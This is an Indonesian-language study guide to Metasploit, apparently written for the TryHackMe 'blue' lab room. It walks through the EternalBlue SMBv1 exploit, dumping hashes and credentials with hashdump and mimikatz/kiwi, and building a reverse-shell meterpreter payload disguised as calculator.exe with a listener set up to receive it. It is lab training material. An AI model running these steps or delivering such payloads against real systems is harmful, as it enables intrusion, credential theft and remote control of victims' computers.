# Memakai Metasploit 2
## Rehearsal: Eternalblue
- Eksploitasi ini memanfaatkan vulnerability pada Microsoft SMBv1 (CVE-2017-0143 - CVE-2017-0148). Integer overflow > buffer overflow > heap spraying. Info di [sini](https://www.sentinelone.com/blog/eternalblue-nsa-developed-exploit-just-wont-die/)
- Eksploit yang didevelop oleh NSA dan pada April 2017 eksploit ini disebar ke publik oleh ShadowBroker
- Eksploit yang dimanfaatkan oleh ransomware: WannaCry, Petya dan NotPetya.

Kali ini kita akan gunakan room blue untuk mengoperasikan EternalBlue
https://tryhackme.com/room/blue
> Notes: Eksploit ini sangat rentan terhadap delay, apabila gagal mengeksploitasi, gunakan attackbox dari TryHackMe

```sh
sudo msfconsole

# cari module yang sesuai
search eternalblue
use <ID>

set RHOST <IP_TARGET>
set LHOST <IP_KAMU>
```

Melihat informasi eksploit dengan lebih detail
```sh
info

show advanced

show evasion
```

Post exploitation
```sh
# dapatkan hash password dari target
hashdump

# kiwi/mimikatz
load kiwi
creds_all
```

## msfvenom
Digunakan untuk generate file payload
```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=eth0 LPORT=4444 -f exe > calculator.exe
```

Jalankan multi handler untuk menangkap koneksi
```sh
sudo msfconsole

search multi/handler
use <ID>

set payload windows/meterpreter/reverse_tcp

set lhost eth0

set lport 4444
```

Delivery payload ke target dan cobalah eksekusi file.exe di dalam komputer target.\

## Modul
- Modul metasploit bawaan kali linux kurang terupdate. 
- Lokasi download modul
	- https://www.rapid7.com/db/
	- https://www.exploit-db.com/
	- https://github.com/rapid7/metasploit-framework/blob/master//modules/auxiliary/scanner/http/wp_registrationmagic_sqli.rb 
  
Apabila menambahkan modul, kamu perlu restart Metasploit, atau reload_all
```sh
# primer
/usr/share/metasploit-framework/modules/

# sekunder (untuk menyimpan custom module)
~/.msf4/modules/
```

Menggunakan modul, sekali sesi
```sh
# teknik 1:
msfconsole -m /lokasi/folder/modul

# teknik 2:
msfconsole
loadpath /lokasi/folder/modul

```

Perlu diperhatikan bahwa directory tree dari modul eksploit baru harus sesuai dengan pembagian folder modul, jadi eksploit baru harus ditempatkan di folder bernama exploit, auxillary, post, atau lainnya.

